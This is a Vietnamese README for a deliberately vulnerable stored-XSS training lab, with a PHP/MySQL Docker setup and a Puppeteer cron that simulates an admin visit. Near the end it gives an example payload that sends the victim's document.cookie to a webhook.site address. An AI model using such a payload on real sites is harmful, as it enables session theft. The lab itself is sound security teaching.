# XSS Lab 02 (Stored XSS) - Hướng dẫn chạy nhanh

Hệ thống PHP 8.1 + MySQL 8.0 trên Docker, cố tình chứa lỗ hổng Stored XSS tại phần bình luận sản phẩm. Bên trong container có cron job chạy mỗi 3 phút mô phỏng admin mở trình duyệt (Puppeteer) truy cập các trang sản phẩm để kích hoạt payload và minh họa chiếm session.

> 📖 **Xem [HD.md](HD.md) để biết hướng dẫn chi tiết về các câu lệnh và cách truyền ENV**

## Cách chạy
```bash
cd /home/ubuntu/Desktop/xss_02
docker compose up -d --build
```

- Ứng dụng: http://localhost:8081
- MySQL: chạy trong container `xss_02_db` (port 3307 cục bộ)

Dừng hệ thống:
```bash
docker compose down
```

Xem log monitor (cron + Puppeteer):
```bash
docker exec xss_02_web tail -f /var/log/admin_monitor.log
```

Reset database (database tự động reset mỗi lần khởi động container):
```bash
docker compose restart db
```

Hoặc khởi động lại toàn bộ:
```bash
docker compose down
docker compose up -d
```

**Nếu gặp lỗi "Column not found":**
```bash
# Chạy migration để thêm các cột còn thiếu
docker compose exec db mysql -uroot -proot123 xss_02_lab < database/migration_add_name.sql

# Hoặc reset hoàn toàn database
docker compose down
docker compose up -d --build
```

**Nếu gặp lỗi "Data too long for column":**
```bash
# Chạy migration để tăng độ dài các cột
docker compose exec db mysql -uroot -proot123 xss_02_lab < database/migration_extend_columns.sql
```

**Lưu ý:** Database không được mount ra ngoài, nên mỗi lần restart container `db`, database sẽ tự động được khởi tạo lại từ `database/init.sql`. Dữ liệu sẽ bị mất khi restart container.

## Tài khoản mẫu (user)
- `user1` / `user123`
- `user2` / `user123`

## Vị trí lỗ hổng XSS (có thể thay đổi)

Lỗ hổng XSS được điều khiển bởi biến môi trường `ENV` khi khởi động. Bạn có thể chỉ định **field cụ thể** hoặc **nhóm field**.

**Quan trọng:** Mỗi lần chỉ có **1 field bị XSS**, các field khác đều được HTML encode (an toàn).

### Các field có thể chỉ định:

**Field cụ thể:**
- `display_name` - Tên hiển thị trong bình luận
- `display_email` - Email hiển thị trong bình luận
- `title` - Tiêu đề bình luận
- `comment` - Nội dung bình luận (mặc định)
- `rating` - Đánh giá (1-5 sao)
- `name` - Tên user (từ bảng users)
- `username` - Username
- `email` - Email user (từ bảng users)
- `product_name` - Tên sản phẩm
- `description` - Mô tả sản phẩm

**Nhóm field (backward compatibility):**
- `users` - Tất cả field user (name, username, email, display_name, display_email)
- `products` - Tất cả field product (product_name, description)
- `comments` - Tất cả field comment (title, comment)

### Cách khởi động với tham số XSS:

**Cách 1: Sử dụng biến môi trường ENV**
```bash
# XSS ở field cụ thể
ENV=display_name docker compose up -d --build
ENV=display_email docker compose up -d --build
ENV=title docker compose up -d --build
ENV=comment docker compose up -d --build
ENV=rating docker compose up -d --build

# Hoặc nhóm field
ENV=users docker compose up -d --build
ENV=products docker compose up -d --build
ENV=comments docker compose up -d --build

# Mặc định: comment
docker compose up -d --build
```

**Cách 2: Sử dụng script helper**
```bash
./scripts/start_lab.sh display_name
./scripts/start_lab.sh title
./scripts/start_lab.sh comment
```

## Tự động mô phỏng Admin (cron + Puppeteer)
- Cron trong container chạy mỗi 3 phút: `node /var/www/html/admin_check.js`.
- Script đăng nhập admin, lần lượt mở `product.php?id=1..4`, sau đó mở `admin.php` bằng headless Chrome.
- Nếu payload chuyển hướng tới webhook, log sẽ hiển thị dấu hiệu cookie bị gửi ra ngoài.

Xem log nhanh:
```bash
docker exec xss_02_web tail -60 /var/log/admin_monitor.log
```

## Giải thích các file quan trọng

### Scripts
- `docker-entrypoint.sh`: Script entrypoint của container web. Khởi động Apache, cấu hình và bật cron để chạy `admin_check.js` mỗi 3 phút.
- `scripts/start_lab.sh`: Script để khởi động lab với field XSS cụ thể (ví dụ: `./scripts/start_lab.sh email`)
- `scripts/reset_lab.sh`: Script để reset lab về trạng thái ban đầu
- `src/admin_check.js`: Script Node.js dùng Puppeteer. Đăng nhập admin, truy cập 4 trang sản phẩm và `admin.php`, chờ JS chạy, kiểm tra việc chuyển hướng hoặc truy vết gửi tới webhook để xác nhận XSS và chiếm session.

### Database
- `database/init.sql`: Script khởi tạo database và dữ liệu mẫu
- `database/migration_add_name.sql`: Script migration để thêm các cột mới vào database
- `database/migration_extend_columns.sql`: Script migration để tăng độ dài các cột (display_name, display_email, title)
- `database/reset_db.sh`: Script entrypoint để reset database mỗi lần container khởi động

## Thử XSS

Tùy thuộc vào giá trị `ENV` khi khởi động, bạn cần test ở field tương ứng:

### Ví dụ với các field cụ thể:

**`ENV=display_name`** - XSS ở tên hiển thị:
1) Đăng nhập với user, vào trang sản phẩm
2) Điền form bình luận với payload XSS trong trường **Tên hiển thị**
3) Các trường khác (email, title, comment) đều an toàn

**`ENV=title`** - XSS ở tiêu đề:
1) Điền payload XSS trong trường **Tiêu đề bình luận**
2) Các trường khác đều an toàn

**`ENV=comment`** (mặc định) - XSS ở nội dung:
1) Điền payload XSS trong trường **Nội dung bình luận**
2) Các trường khác đều an toàn

**`ENV=display_email`** - XSS ở email:
1) Điền payload XSS trong trường **Email**
2) Các trường khác đều an toàn

**Payload ví dụ:**
```html
<script>document.location='https://webhook.site/ID-CUA-BAN/?cookie='+document.cookie</script>
```

**Sau khi inject payload:**
- Chờ 3-4 phút: cron sẽ chạy, admin giả lập truy cập trang → cookie bị gửi tới webhook (kiểm trong log và tại webhook).
- **Lưu ý:** Chỉ field được chỉ định mới bị XSS, các field khác đều được HTML encode nên an toàn.

## Lưu ý
- Mục đích học tập. Không sử dụng ngoài phạm vi lab.
